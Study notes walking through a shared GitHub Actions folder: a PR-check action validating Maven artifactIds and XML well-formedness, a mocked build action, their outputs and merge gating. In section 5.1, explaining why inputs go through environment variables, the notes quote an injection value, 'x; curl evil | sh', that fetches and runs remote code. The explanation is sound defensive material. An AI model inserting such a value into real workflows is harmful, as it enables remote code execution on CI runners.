# The `actions/` folder, explained file by file

Private study notes, not pushed to any repository.

This document explains everything inside `devsecops-shared-github-actions/actions/`: what each file is for, why it exists, which file calls it, what it calls, what every function does, and where its results go afterwards. Read it top to bottom once; after that, use the file sections as a reference.

Line numbers refer to the files at release `v1.1.0` (the current `v1`).

---

## 1. What the folder is, and why it exists

A GitHub **workflow** (`.github/workflows/*.yml`) decides *when* and *in what order* things run. A GitHub **action** is a reusable unit of work that a workflow step calls with `uses:`. This folder holds the two actions of the shared framework, matching the "Actions" box in `image.png`:

| Action | Question it answers | Called by |
|---|---|---|
| `prcheck-utils-action` | *May* this PR be built and merged? | `pr_check.yml` |
| `build-action` | *How* is this artifact type built? | `build.yml` (the `build` job) |

Both follow the same layout from the diagram: `action.yml` (the interface), `main.py` (the entry point) and `utils/` (the logic).

**Why the logic lives in actions and not directly in the workflow YAML:**

- YAML is good at wiring steps together, but poor at logic. Parsing XML, grouping results and handling errors belong in a real programming language, where they can be unit-tested.
- An action has a clear contract (inputs and outputs), so the workflows stay short and readable.
- Every repo gets the same logic from one place, versioned with the `v1` tag.

**Why composite actions with Python:** a composite action is just a list of steps, so there's no Docker image to build or pull, and no JavaScript bundle to maintain. Python ships with the GitHub runner, and the code uses only the standard library, so there's nothing to install.

Both actions are **mocks** of private internal components. Their interfaces are documented in `docs/assumptions.md`.

---

## 2. Folder map

```
actions/
  prcheck-utils-action/              "PR_check action" in image.png
    action.yml                       interface: inputs, outputs, and the two steps that run
    main.py                          entry point: reads inputs, runs checks, publishes results
    utils/
      __init__.py                    marks utils/ as a Python package
      result_utils.py                CheckResult, result_map, block_merge rule
      fs_utils.py                    safe path resolution, recursive file search
      backend_validator.py           rule: every pom.xml has the same artifactId
      frontend_validator.py          rule: every .xml under xml_path is well-formed
  build-action/                      "build Action" in image.png
    action.yml                       interface for the build step
    main.py                          entry point: picks and reports the build plan
    utils/
      __init__.py                    marks utils/ as a Python package
      build_plans.py                 artifact_type -> list of build commands
```

11 files and about 730 lines in total.

---

## 3. Upstream: who uses the folder

"Upstream" means everything that happens *before* the action runs and hands it its inputs.

### 3.1 The full chain for a pull request

```
Developer opens or updates a PR in a consumer repo (e.g. backend-sample)
   |
   v
consumer .github/workflows/build.yml            with: artifact_type: backend
   |  uses: Mahesh2511/devsecops-shared-github-actions/.github/workflows/build.yml@v1
   v
shared .github/workflows/build.yml
   |  job pr-check (line 35): uses ./.github/workflows/pr_check.yml
   |     with: artifact_type, xml_path (lines 39-40)
   v
shared .github/workflows/pr_check.yml, job pr-checks
   |  step [1] actions/checkout      -> the consumer's code lands in $GITHUB_WORKSPACE
   |  step [2] line 54:
   |     uses: Mahesh2511/devsecops-shared-github-actions/actions/prcheck-utils-action@v1
   |     with: artifact_type, xml_path (lines 56-57)
   v
actions/prcheck-utils-action/action.yml        <-- THIS FOLDER STARTS HERE
```

And for the build, after the PR check has passed:

```
shared build.yml, job build (runs only if pr-check passed; line 52)
   |  checkout the consumer's code again (jobs don't share files)
   |  line 72: uses: Mahesh2511/devsecops-shared-github-actions/actions/build-action@v1
   |     with: artifact_type (line 74)
   v
actions/build-action/action.yml                <-- THIS FOLDER STARTS HERE
```

### 3.2 Every caller of the folder

| Caller | Where | How it refers to the action | What it passes |
|---|---|---|---|
| `pr_check.yml` | line 54 | `Mahesh2511/devsecops-shared-github-actions/actions/prcheck-utils-action@v1` | `artifact_type`, `xml_path` |
| `build.yml` | line 72 | `Mahesh2511/devsecops-shared-github-actions/actions/build-action@v1` | `artifact_type` |
| `ci.yml` (framework self-test) | line 59 | `./actions/prcheck-utils-action` | `artifact_type`, `xml_path`, `working_directory` (pointing at `tests/fixtures/...`) |
| `ci.yml` (framework self-test) | line 90 | `./actions/build-action` | `artifact_type` |
| Unit tests | `tests/support.py` line 11 | puts `actions/prcheck-utils-action` on Python's import path | direct function calls |
| Unit tests | `tests/test_main.py` line 24, `tests/test_build_action.py` line 21 | run `main.py` as a separate process | environment variables, like GitHub does |

**Why two different reference styles?**

- **Consumer runs use `owner/repo/actions/...@v1`.** At that moment the checked-out code in the workspace is the *consumer's* repo. A `./actions/...` path would look for the action inside backend-sample, where it doesn't exist. And `uses:` can't contain expressions, so the full name and tag are written out.
- **`ci.yml` uses `./actions/...`,** because there the checked-out code *is* the shared repo. That way CI tests the action code on the branch being changed, before anything is tagged.

### 3.3 The contract between caller and action

- **The caller must check out the source first.** The action only reads files. It never fetches code itself. That's why `pr_check.yml` has its checkout step before the action.
- **Inputs are strings.** GitHub passes every action input as text, so the action does its own validation (`artifact_type` could be anything).

---

## 4. `prcheck-utils-action`: the runtime flow in one picture

What happens, in order, when `pr_check.yml` line 54 runs:

```
action.yml
  step "Set up Python"      actions/setup-python@v5, Python 3.12
  step "Run PR checks"      env: PRCHECK_ARTIFACT_TYPE, PRCHECK_XML_PATH,
                                 PRCHECK_RESULT_MAP, PRCHECK_WORKING_DIRECTORY
                            run: python "$GITHUB_ACTION_PATH/main.py"
     |
     v
main.py  main()
  1. parse_args()              env vars (or CLI flags) -> args
  2. config = {artifact_type, xml_path, working_directory}
  3. run_checks(workspace, config, incoming result_map)
       parse_result_map()                          result_utils
       resolve_within(workspace, working_directory) fs_utils
       for each check in CHECKS:
          run_artifact_consistency(root, config)
             VALIDATORS[artifact_type]
                backend  -> validate_backend()    backend_validator
                              find_files()          fs_utils
                              extract_artifact_id() per pom.xml
                frontend -> validate_frontend()   frontend_validator
                              resolve_within()      fs_utils
                              find_files()          fs_utils
                              check_well_formed()   per .xml
             returns a CheckResult                 result_utils
          update_result_map(result_map, name, result)
  4. block_merge = compute_block_merge(result_map)  result_utils
  5. print_report()        -> the job log
  6. write_outputs()       -> $GITHUB_OUTPUT        (becomes the step outputs)
  7. write_step_summary()  -> $GITHUB_STEP_SUMMARY  (the table on the run page)
  8. emit_annotations()    -> "::error ...::" lines (red errors on the PR)
  9. return exit code 0    (1 only on a crash, or locally with --enforce)
     |
     v
action.yml outputs: result_map, block_merge    -> back to pr_check.yml (downstream, section 8)
```

**Dependency direction inside the folder.** Arrows mean "imports":

```
main.py --> backend_validator.py --> fs_utils.py
   |    --> frontend_validator.py --> fs_utils.py
   |              |                   result_utils.py
   |              +-----------------> result_utils.py
   +------> fs_utils.py
   +------> result_utils.py
```

`result_utils.py` and `fs_utils.py` import nothing from the project; they're the foundation. The validators build on them, and `main.py` sits on top. Nothing imports `main.py` except the tests.

---

## 5. `prcheck-utils-action`, file by file

### 5.1 `action.yml` (55 lines)

**What it is:** the public interface of the action. GitHub reads this file when a workflow says `uses: .../prcheck-utils-action@v1`.

**Why it was created:** a workflow can only call an action that has an `action.yml`. This file declares what the action accepts, what it returns, and what it runs.

**Section by section:**

- **Lines 1-6, header comment.** Marks the file as a mock, and states the contract: the caller must check out the source first.
- **Lines 12-27, `inputs`:**

  | Input | Required | Default | Purpose |
  |---|---|---|---|
  | `artifact_type` | yes | | Selects the validator |
  | `xml_path` | no | `""` | Folder to scan, for frontend |
  | `result_map` | no | `"{}"` | Results of earlier checks, to merge into |
  | `working_directory` | no | `"."` | Where scanning starts. Used by `ci.yml` to point at fixtures, and for monorepos |

- **Lines 29-35, `outputs`:** `result_map` and `block_merge`. Each output reads a value that the step with `id: run` wrote (`${{ steps.run.outputs.result_map }}`).
- **Line 38, `using: composite`:** this action is a list of steps, not a Docker container or a JavaScript program.
- **Lines 40-43, "Set up Python":** pins Python 3.12, so the code runs on the same version everywhere.
- **Lines 45-55, "Run PR checks":**
  - `id: run` names the step so the outputs above can refer to it.
  - `env:` copies each input into a `PRCHECK_*` environment variable.
  - `run: python "$GITHUB_ACTION_PATH/main.py"` starts the program. `$GITHUB_ACTION_PATH` is the folder where GitHub downloaded this action.

**The key security decision (lines 48-54).** Inputs go through `env:` and are never pasted into the `run:` script. If the script said `python main.py --xml-path ${{ inputs.xml_path }}`, GitHub would insert the text *before* the shell runs, so a value like `x; curl evil | sh` would become a command. As an environment variable, it's only ever data. This matters because consumer workflow files can be changed in a PR, so the inputs are untrusted.

### 5.2 `main.py` (216 lines)

**What it is:** the program the action runs. It connects GitHub (environment variables, output files) with the check logic (the `utils/` modules).

**Why it was created:** someone has to read the inputs, decide which checks run, combine the results and report them in the formats GitHub understands. Keeping all GitHub-specific I/O in this one file means the `utils/` modules are plain Python that knows nothing about GitHub, which makes them easy to test.

**Called by:** `action.yml` line 55 (on GitHub), the tests, or you from a terminal.
**Calls:** everything in `utils/`.

#### Lines 1-26, module docstring

Documents the inputs (environment variable and matching CLI flag), the outputs, and the exit code rule. Read it first; it's the summary of the file.

#### Lines 28-49, imports

- `from __future__ import annotations` lets the type hints use newer syntax (`str | None`) on older Pythons.
- Standard library only: `argparse` (flags), `json`, `os` (environment), `sys` (exit code), `traceback` (crash log), `uuid` (unique delimiter), `pathlib.Path`.
- `from utils.backend_validator import validate_backend` and the other `utils` imports work because Python adds the folder of the script being run (`prcheck-utils-action/`) to its import path. So `utils` is found as a package next to `main.py`.

#### Line 51, `ARTIFACT_CHECK_NAME = "artifact_consistency"`

The key under which this check's result is stored in `result_map`. It's a constant so the name is written in exactly one place.

#### Lines 53-57, the `VALIDATORS` registry

```python
VALIDATORS = {"backend": validate_backend, "frontend": validate_frontend}
```

A dictionary from artifact type to validator function. Every validator has the same signature: `(root: Path, config: dict) -> CheckResult`.

**Why a registry instead of `if/else`:** adding an artifact type means adding one entry. No other code changes, and the error message listing the supported values updates itself.

#### Lines 60-73, `run_artifact_consistency(root, config)`

The `artifact_consistency` check itself: it picks the right validator for the declared type.

- **Line 62** normalizes the input: `" Backend "` becomes `"backend"`.
- **Lines 64-65:** empty type -> failure `artifact_type is required. Supported values: backend, frontend.`
- **Lines 66-69:** unknown type -> failure `Unsupported artifact_type 'mobile'. ...` (it quotes the original value the user wrote).
- **Line 71:** otherwise, call the validator from the registry.
- **Line 72:** records the normalized type in the result's `metadata`, so it appears in `result_map` as `"artifact_type": "backend"`.

**Important:** this is the only place the type is decided, and it uses only the declared input. Nothing looks at file names or the repo name.

#### Lines 76-79, the `CHECKS` registry

```python
CHECKS = {ARTIFACT_CHECK_NAME: run_artifact_consistency}
```

A dictionary from check name to check function. Today there's one check. The real organization's other PR checks (security, dependencies ...) would be registered here too, or arrive through the `result_map` input. Each registered check produces one `result_map` entry.

#### Lines 82-98, `run_checks(workspace, config, incoming_result_map)`

Runs every registered check and returns the combined `result_map`.

1. **Lines 84-87:** parse the incoming `result_map` from earlier checks. If it's broken JSON, the problem itself becomes a failing entry named `result_map_input`, so broken input blocks the merge instead of being ignored.
2. **Lines 89-94:** work out the scan root: the workspace plus `working_directory`, refusing anything outside the workspace. If that fails, every check is marked failed with the reason, and the function returns early.
3. **Lines 96-97:** run each check and store its result with `update_result_map`.

#### Lines 101-164, GitHub I/O helpers

These functions only format and write. They make no decisions.

- **`_escape_command_data` and `_escape_command_property` (lines 104-109).** GitHub "workflow commands" (`::error ...::message`) treat `%`, newlines, `:` and `,` specially. These helpers encode them (`%25`, `%0A`, `%3A`, `%2C`), so a message containing a colon or a newline can't break the command.
- **`write_outputs(result_map, block_merge)` (lines 112-121).** GitHub gives every step a file, whose path is in `$GITHUB_OUTPUT`. Lines appended to it become the step's outputs.
  - `result_map` is written in the multi-line "heredoc" form: `result_map<<EOF_<random>` ... `EOF_<random>`. A random delimiter (from `uuid`) guarantees the JSON can never accidentally contain it.
  - `block_merge` is written as `block_merge=true` or `block_merge=false`.
  - The JSON uses compact separators and sorted keys, so it's small and always in the same order.
  - If `$GITHUB_OUTPUT` isn't set (a local run), the function does nothing.
- **`emit_annotations(result_map, working_directory)` (lines 124-139).** Prints `::error ...::` lines, which GitHub turns into red error annotations on the run and the PR.
  - It only does this on GitHub (`GITHUB_ACTIONS == "true"`), so local output stays readable.
  - For each error of each failed check: if the error starts with `<something>.xml: `, the file path is attached (`file=config/settings.xml`), so the annotation appears on that file in the PR's *Files changed* tab.
  - An error like `artifactId mismatch: ...` isn't about one file, so it's attached to the check instead.
  - Paths are prefixed with `working_directory`, so they're correct relative to the repo root.
- **`write_step_summary(result_map, block_merge)` (lines 142-164).** Appends Markdown to the file in `$GITHUB_STEP_SUMMARY`. GitHub renders it on the run's summary page: a table of every check (name, required, PASS/FAIL, summary), the `block_merge` value, and the error list. `|` characters inside summaries are escaped so they don't break the table.

#### Lines 167-174, `print_report(result_map, block_merge)`

Prints the full `result_map` as indented JSON, then one final line: `block_merge=true (failed required checks: ...)` or `block_merge=false (all required checks passed)`. That's what you read in the job log.

#### Lines 180-189, `parse_args(argv)`

Defines the CLI flags. Each flag's **default is the matching environment variable**. The same program therefore works both ways:

- **On GitHub:** there are no flags, so everything comes from the `PRCHECK_*` variables set by `action.yml`.
- **Locally:** `python main.py --artifact-type backend --workspace ../backend-sample`.

`--workspace` defaults to `$GITHUB_WORKSPACE` (where checkout put the code) or the current folder. `--enforce` exists only for local and standalone use.

#### Lines 192-212, `main(argv)`

The orchestrator:

1. Read the arguments and build the `config` dictionary (lines 193-198).
2. Run all checks (line 200). If *anything* unexpected crashes (lines 201-205), it prints the traceback, publishes a failing `result_map` with `block_merge=true`, and returns 1. A crash can never look like a pass.
3. Compute `block_merge` (line 207).
4. Report through all four channels: the log, the outputs, the summary and the annotations (lines 208-211).
5. Return the exit code (line 212): **0**, even when the check failed, unless `--enforce` was given.

**Why exit 0 on a failed check:** the action's job is to *produce the verdict*. Enforcing it is the job of the "Enforce merge gate" step in `pr_check.yml`. Keeping the two apart guarantees the outputs, the summary and the annotations are always published, and gives one clear place where the job is failed.

#### Lines 215-216

`if __name__ == "__main__": sys.exit(main())` runs `main()` only when the file is executed as a program, not when the tests import it.

### 5.3 `utils/__init__.py` (1 line)

Only a docstring. Its presence makes `utils/` a Python *package*, which is what allows `from utils.backend_validator import ...` in `main.py`, and the relative imports (`from .fs_utils import ...`) inside the validators.

### 5.4 `utils/result_utils.py` (103 lines)

**What it is:** the shared vocabulary of all checks. It defines what a result looks like, how results are combined, and the rule that decides `block_merge`.

**Why it was created:** the exercise requires the new check to join the *existing* result_map / block-merge mechanism. Putting that mechanism in one module, independent of any particular check, means every current and future check reports and gates the same way.

**Used by:** `main.py`, `backend_validator.py`, `frontend_validator.py`.
**Uses:** only the standard library (`json`, `dataclasses`).

- **Lines 1-19, docstring:** the `result_map` format, one entry per check:
  ```json
  { "<check_name>": { "passed": true, "required": true, "summary": "...", "errors": [], "details": {} } }
  ```
- **Lines 28-29, `ResultMapError`:** raised when an incoming `result_map` can't be trusted.
- **Lines 32-51, `class CheckResult`:** a dataclass holding one check's answer.

  | Field | Meaning |
  |---|---|
  | `passed` | The answer: `True` or `False` |
  | `summary` | One-line human description |
  | `errors` | List of problems, each ideally starting with the file it concerns |
  | `details` | Check-specific diagnostics (e.g. `files_inspected`) |
  | `required` | `False` means report only, never block (for rolling out new rules) |
  | `metadata` | Extra top-level fields for the entry (e.g. `artifact_type`) |

  - **`CheckResult.failure(summary, errors=None, **details)` (lines 41-43):** a shortcut for the most common failure. If no error list is given, the summary becomes the single error. It's used for every configuration error.
  - **`to_dict()` (lines 45-51):** turns the result into the plain dictionary stored in `result_map`. `passed` and `required` come first, then the metadata, then summary, errors and details.
- **Lines 54-66, `parse_result_map(raw)`:** reads the incoming JSON. Empty means "no earlier checks" (`{}`). Broken JSON, or JSON that isn't an object, raises `ResultMapError` with a clear message.
- **Lines 69-73, `update_result_map(result_map, check_name, result)`:** returns a **copy** of the map with the new entry added, replacing any old entry of the same name. Returning a copy means the caller's map is never changed behind its back (a test checks this).
- **Lines 76-92, `compute_block_merge(result_map)`: the decision rule.**
  ```
  empty map                                -> block   (nothing vouched for the PR)
  any entry that isn't a dictionary        -> block   (malformed)
  entry with required == False             -> skip    (advisory)
  entry whose passed is not literally True -> block   (missing, "true", 1, null ... all block)
  otherwise                                -> don't block
  ```
  It uses `is True` and `is False` on purpose: only a real boolean counts. A string `"true"` in some other check's output would *not* pass. That's the fail-safe design: anything unclear blocks.
- **Lines 95-103, `failed_checks(result_map)`:** the same rule, but returning the *names* of the checks that caused the block. It's used for the log line and the error list in the summary.

### 5.5 `utils/fs_utils.py` (56 lines)

**What it is:** filesystem helpers shared by both validators.

**Why it was created:** both validators need to find files recursively and handle paths safely. Writing that once means both behave identically and the security check can't be forgotten in one of them.

**Used by:** `main.py` (`resolve_within`), `backend_validator.py` (`find_files`, `display_path`), `frontend_validator.py` (all three).

- **Line 11, `SKIPPED_DIRS = {".git"}`:** the only folder never scanned. It's kept tiny on purpose: skipping more (say `target/` or `node_modules/`) is a policy decision that belongs in configuration, not hidden in code.
- **Lines 14-15, `PathConfigError`:** raised for an unsafe or unusable configured path.
- **Lines 18-33, `resolve_within(root, relative, label)`:** turns a configured path into a real absolute path, and **refuses it if it points outside the repository**.
  - `resolve()` expands `..` and symlinks, so `config/../../etc` really becomes `/etc`.
  - `relative_to(root)` then fails if the result isn't inside `root`.
  - This blocks both `../..` tricks and absolute paths like `/etc`.
  - `label` (`"xml_path"` or `"working_directory"`) is only used to make the error message say which input was wrong.
- **Lines 36-48, `find_files(base, predicate)`:** walks the folder tree with `os.walk`, keeps each file whose *name* passes `predicate`, and returns them sorted.
  - `dirnames[:] = sorted(...)` does two things. It removes skipped folders, so `os.walk` won't descend into them. And it sorts the folders, so the walk order is always the same.
  - The final `sorted(...)` makes the result order deterministic. The same repo always produces the same log and the same `result_map`, which keeps tests stable and logs comparable.
  - `os.walk` doesn't follow symlinked folders by default, so a link can't make the scan loop or leave the repo.
- **Lines 51-56, `display_path(path, root)`:** converts an absolute path into a short repo-relative path with forward slashes (`service-b/pom.xml`), even on Windows. It's used in every message and annotation.

### 5.6 `utils/backend_validator.py` (92 lines)

**What it is:** the backend rule: every `pom.xml` in the repository must declare the same project `artifactId`.

**Why it was created:** it's the backend half of exercise section 3 ("traverse all pom.xml files, extract the artifactId, determine whether all match").

**Called by:** `main.py`, through `VALIDATORS["backend"]`.
**Calls:** `find_files` and `display_path` (`fs_utils`), `CheckResult` (`result_utils`), and the standard XML parser `xml.etree.ElementTree`.

- **Line 17, `POM_FILENAME = "pom.xml"`:** the exact file name. Maven only recognizes this name, and it's case-sensitive.
- **Lines 20-22, `_local_name(tag)`:** Maven POMs usually declare a namespace. The parser then reports tags as `{http://maven.apache.org/POM/4.0.0}artifactId`. This helper keeps only the part after `}`, so the code works for POMs with and without a namespace.
- **Lines 25-42, `extract_artifact_id(pom_path)`:** reads one POM and returns its project artifactId, or raises `ValueError` with a clear reason.
  1. **Lines 27-30:** parse the file. Broken XML -> `malformed XML: <parser message with line and column>`.
  2. **Lines 32-33:** the root element must be `<project>`, or it isn't a POM -> `not a Maven POM (root element is <settings>, expected <project>)`.
  3. **Lines 35-40:** look only at the **direct children** of `<project>` (`for child in root`, one level deep, not a deep search). The first `artifactId` found is the project's own. Empty text -> `<artifactId> is present but empty`. Line 36's `isinstance(child.tag, str)` skips XML comments, whose tags aren't strings.
  4. **Line 42:** none found -> `no project-level <artifactId> element (a direct child of <project>)`.

  **Why only direct children:** a POM also contains `artifactId` inside `<parent>`, `<dependencies>`, `<plugins>` and more. Those name *other* projects. Comparing them would make every real repo fail. This is the most important correctness detail of the backend rule.
- **Lines 45-92, `validate_backend(root, config)`:**
  1. **Line 47:** find every file named exactly `pom.xml`, at any depth.
  2. **Lines 48-52:** none found -> failure. A repo declared as backend with no POM is misconfigured; "nothing to check" doesn't count as a pass.
  3. **Lines 54-61:** extract each artifactId. Files that fail go into `errors` as `<file>: <reason>`. The loop continues, so *all* problems are reported in one run, not just the first.
  4. **Lines 64-66:** group files by artifactId: `{"sample-service": ["pom.xml", "service-a/pom.xml"], "another-service": ["service-b/pom.xml"]}`.
  5. **Lines 68-70:** more than one group -> the mismatch error, listing every value and its files.
  6. **Lines 72-77, `details` (diagnostics for the log):** `files_inspected`, `artifact_ids` (file -> id), `distinct_artifact_ids`, `files_by_artifact_id`.
  7. **Lines 79-85:** any error -> `passed=False`.
  8. **Lines 87-92:** otherwise exactly one group exists. `(only_id,) = groups` takes its single key (it would crash if there were more, which can't happen at this point), and the result is `passed=True` with `All 3 pom.xml file(s) declare artifactId 'sample-service'.`

  **Note:** `config` isn't used by the backend validator. It's in the signature so every validator in the registry can be called the same way.

### 5.7 `utils/frontend_validator.py` (84 lines)

**What it is:** the frontend rule: every `.xml` file under the configured folder must be well-formed.

**Why it was created:** it's the frontend half of exercise section 3 ("traverse all .xml files within a given path, determine whether every XML file is well-formed").

**Called by:** `main.py`, through `VALIDATORS["frontend"]`.
**Calls:** `resolve_within`, `find_files`, `display_path` (`fs_utils`), `CheckResult` (`result_utils`), `xml.etree.ElementTree`.

- **Line 16, `XML_SUFFIX = ".xml"`.**
- **Lines 19-25, `check_well_formed(xml_file)`:** parses the file. It returns `None` if the file parses, or the parser's message (e.g. `mismatched tag: line 8, column 2`) if not. "Well-formed" means the document is valid XML syntax: tags open and close properly, there's one root, and so on. It doesn't check a schema or the content, because the requirement only asks for well-formedness.
- **Lines 28-84, `validate_frontend(root, config)`.** The checks happen in a deliberate order, so the most helpful message wins:
  1. **Lines 30-35:** `xml_path` must be given -> otherwise `xml_path is required when artifact_type is 'frontend'; ...`.
  2. **Lines 37-40:** it must stay inside the repo (`resolve_within`) -> otherwise `resolves outside the repository root`.
  3. **Lines 42-43:** it must exist -> otherwise `does not exist in the repository`.
  4. **Lines 44-45:** it must be a folder -> otherwise `is not a directory`.
  5. **Lines 47-53:** find every file ending in `.xml`. The check is case-insensitive (`name.lower()`), so `EN.XML` counts. None found -> failure.
  6. **Lines 55-63:** parse each file and sort it into `valid` or `invalid` (with its error). Every file is checked, so all bad files are reported together.
  7. **Lines 65-70, `details`:** `xml_path`, `files_inspected`, `valid_files`, `invalid_files`.
  8. **Lines 72-78:** any invalid file -> `passed=False`, one error per file as `<file>: <parser message>`. That format is what lets `emit_annotations` in `main.py` attach each error to its file on the PR.
  9. **Lines 80-84:** otherwise `passed=True` with `All 3 XML file(s) under 'config' are well-formed.`

  **Note:** only files *below* `xml_path` are read. A broken XML file elsewhere in the repo doesn't affect the result, because the repo declared which folder matters.

---

## 6. `build-action`, file by file

### 6.1 `action.yml` (34 lines)

**What it is:** the interface of the build step, with the same structure as the PR-check action.

- **Input:** `artifact_type` (required).
- **Outputs:** `artifact_type` (normalized) and `build_status` (`mocked`), read from the step with `id: build`.
- **Steps:** "Set up Python" (3.12), then "Build", which puts `artifact_type` into the `BUILD_ARTIFACT_TYPE` environment variable (again, never pasted into the script) and runs `python "$GITHUB_ACTION_PATH/main.py"`.

**Why it was created:** `image.png` shows a build action next to the PR-check action. Moving the per-type build steps out of `build.yml` into an action means `build.yml` has one build step for all types, and the type-specific knowledge lives in one testable place.

### 6.2 `main.py` (53 lines)

**What it is:** the entry point of the build action.

**Called by:** `action.yml` (on GitHub), `tests/test_build_action.py` (as a separate process), or you from a terminal.
**Calls:** `resolve_plan` in `utils/build_plans.py`.

- **Lines 27-30:** flags `--artifact-type` (default: `BUILD_ARTIFACT_TYPE`) and `--workspace` (default: `GITHUB_WORKSPACE`), the same "flag or environment variable" pattern as the PR check.
- **Lines 32-36:** get the plan. For an unknown type it prints an error (as a GitHub `::error` annotation when running on GitHub, plain text locally) and exits 1. Unlike the PR check, a failure here *should* fail the step directly: there's no separate gate behind it.
- **Lines 38-41:** print `Building <type> artifact from <workspace>`, then each plan step as `MOCK step N: <command>`.
- **Lines 43-45:** write the outputs `artifact_type` and `build_status=mocked` to `$GITHUB_OUTPUT`.
- **Lines 46-48:** write a small numbered list of the plan to the job summary.

**Why it's mocked:** the real build commands are private. In addition, the backend sample can't actually build with Maven, because Maven rejects modules that share one artifactId. So it prints the plan instead of running it.

### 6.3 `utils/build_plans.py` (36 lines)

**What it is:** the knowledge of how each artifact type is built.

- **Lines 12-22, `BUILD_PLANS`:** a registry from type to command list:
  - backend: `mvn -B -ntp verify`, then publish the jar
  - frontend: `npm ci`, `npm run build`, then publish `dist/`

  It mirrors `VALIDATORS` in the PR-check action: adding an artifact type means one entry in each registry.
- **Lines 25-26, `UnsupportedArtifactType`:** a specific error type, so `main.py` can catch exactly this case.
- **Lines 29-36, `resolve_plan(artifact_type)`:** normalizes the type (strips spaces, lowercases), raises the error with the list of supported values if it's unknown, and otherwise returns a **copy** of the plan (so callers can't change the registry by accident).

### 6.4 `utils/__init__.py`

Same role as in the PR-check action: it makes `utils/` a package.

**A naming detail:** both actions have `main.py` and a `utils` package. That's fine on GitHub, where each action runs as its own process. But in one Python process, the second `import utils` would get the first one's package. That's why the tests import the PR-check action's modules directly, but run the build action only as a separate process (`tests/test_build_action.py`).

---

## 7. Data shapes at each boundary

What the data looks like as it passes each point, using the backend mismatch example.

**1. Into the action (`with:` in `pr_check.yml`):**
```yaml
artifact_type: backend
xml_path: ""
```

**2. Into Python (environment, set by `action.yml`):**
```
PRCHECK_ARTIFACT_TYPE=backend
PRCHECK_XML_PATH=
PRCHECK_RESULT_MAP={}
PRCHECK_WORKING_DIRECTORY=.
GITHUB_WORKSPACE=/home/runner/work/backend-sample/backend-sample
```

**3. Out of the validator (a `CheckResult`):**
```
passed=False
summary="Backend artifact consistency FAILED for 3 pom.xml file(s)."
errors=["artifactId mismatch: 2 distinct values found: 'another-service' in service-b/pom.xml; 'sample-service' in pom.xml, service-a/pom.xml"]
details={files_inspected: [...], artifact_ids: {...}, distinct_artifact_ids: [...], files_by_artifact_id: {...}}
```

**4. In `result_map` (after `update_result_map`):**
```json
{"artifact_consistency": {"passed": false, "required": true, "artifact_type": "backend",
  "summary": "...", "errors": ["..."], "details": {"...": "..."}}}
```

**5. In the `$GITHUB_OUTPUT` file (written by `write_outputs`):**
```
result_map<<EOF_6d50007240de4017acbd9fcda6e0eaf0
{"artifact_consistency":{"artifact_type":"backend","details":{...},"errors":[...],"passed":false,"required":true,"summary":"..."}}
EOF_6d50007240de4017acbd9fcda6e0eaf0
block_merge=true
```

**6. In the log (annotation line, written by `emit_annotations`):**
```
::error title=PR check%3A artifact_consistency::artifactId mismatch: 2 distinct values found: ...
```

**7. On the run page (job summary, written by `write_step_summary`):**
```
## PR checks (prcheck-utils-action)
| Check | Required | Result | Summary |
| `artifact_consistency` | yes | FAIL | Backend artifact consistency FAILED for 3 pom.xml file(s). |
**block_merge = `true`**
- `artifact_consistency`: artifactId mismatch: ...
```

---

## 8. Downstream: where the results go

"Downstream" means everything that happens *after* the action finished, using what it produced.

```
prcheck-utils-action
  |
  |-- outputs result_map, block_merge  (action.yml lines 29-35)
  |      |
  |      v
  |   pr_check.yml, step id "prcheck"
  |      |-- step "Enforce merge gate" (lines 64-72)
  |      |      reads steps.prcheck.outputs.block_merge
  |      |      "false" -> exit 0 (job passes)
  |      |      anything else -> ::error Merge blocked, exit 1 (job fails)
  |      |
  |      |-- job outputs (lines 33-35) -> workflow_call outputs (lines 18-24)
  |             |
  |             v
  |          build.yml
  |             needs.pr-check.result and needs.pr-check.outputs.block_merge
  |             -> job "build" runs only if result == success and block_merge == 'false' (line 52)
  |             -> "Build context" step prints the result_map (line 63)
  |             -> re-exported as build.yml's own outputs (lines 20-25), available to the consumer
  |
  |-- exit code 0 -> the "Run PR checks" step is green (the gate decides the job)
  |-- job log     -> the printed result_map and block_merge line (print_report)
  |-- job summary -> the table on the run page (write_step_summary)
  |-- annotations -> red errors on the run page, and on files in the PR's Files changed tab
  |
  v
The PR on GitHub
  check "build / PR Check / PR checks" = the pr-checks job's result
  branch protection requires that check to pass -> merge allowed or blocked
```

And for the build action:

```
build-action
  |-- outputs artifact_type, build_status -> available to later steps (ci.yml asserts them)
  |-- log: the MOCK plan steps
  |-- job summary: the numbered plan
  |-- exit code: 0 -> "build / Build" is green; 1 (unknown type) -> the build job fails
```

**The whole downstream story in one sentence:** the action publishes a verdict, the gate step turns it into a job result, `needs` turns the job result into "build or skip", and branch protection turns the check result into "merge or block".

---

## 9. Running each piece on its own

From `E:\Task\implementation\shared-devsecops` in Git Bash:

```bash
# the PR-check action, like GitHub runs it
python actions/prcheck-utils-action/main.py --artifact-type backend --workspace ../backend-sample
python actions/prcheck-utils-action/main.py --artifact-type frontend --xml-path config --workspace ../frontend-sample --enforce; echo "exit=$?"

# with the GitHub files simulated, to see outputs, summary and annotations
touch /tmp/out /tmp/sum
GITHUB_ACTIONS=true GITHUB_OUTPUT=/tmp/out GITHUB_STEP_SUMMARY=/tmp/sum \
  python actions/prcheck-utils-action/main.py --artifact-type backend --workspace tests/fixtures/backend/mismatch
cat /tmp/out /tmp/sum

# single functions, from Python
cd actions/prcheck-utils-action
python -c "from pathlib import Path; from utils.backend_validator import extract_artifact_id; print(extract_artifact_id(Path('../../../backend-sample/service-b/pom.xml')))"
python -c "from utils.result_utils import compute_block_merge; print(compute_block_merge({'a': {'passed': True}, 'b': {'passed': 'true'}}))"
cd ../..

# the build action
python actions/build-action/main.py --artifact-type frontend
```

The second-to-last command prints `True`: a string `"true"` doesn't count as passed.

---

## 10. Which tests cover which file

| File | Test file | What's tested |
|---|---|---|
| `main.py` | `tests/test_main.py` | Dispatch by type, unsupported and empty type, merging with existing checks, broken incoming result_map, `working_directory` escape, the `$GITHUB_OUTPUT` format, exit codes, `--enforce` |
| `utils/result_utils.py` | `tests/test_result_utils.py` | Adding entries without changing the input, the block rule, existing failures still blocking, advisory checks, every fail-safe case, JSON parsing |
| `utils/backend_validator.py` | `tests/test_backend_validator.py` | Pass, recursion, parent and dependency IDs ignored, mismatch, missing, empty, non-POM root, malformed, no POM |
| `utils/frontend_validator.py` | `tests/test_frontend_validator.py` | Pass, scope (outside files and non-XML ignored), configurable path, malformed, missing path, no `xml_path`, no XML, file instead of folder, path escape |
| `utils/fs_utils.py` | through the validator tests | Recursion, sorting, escape protection |
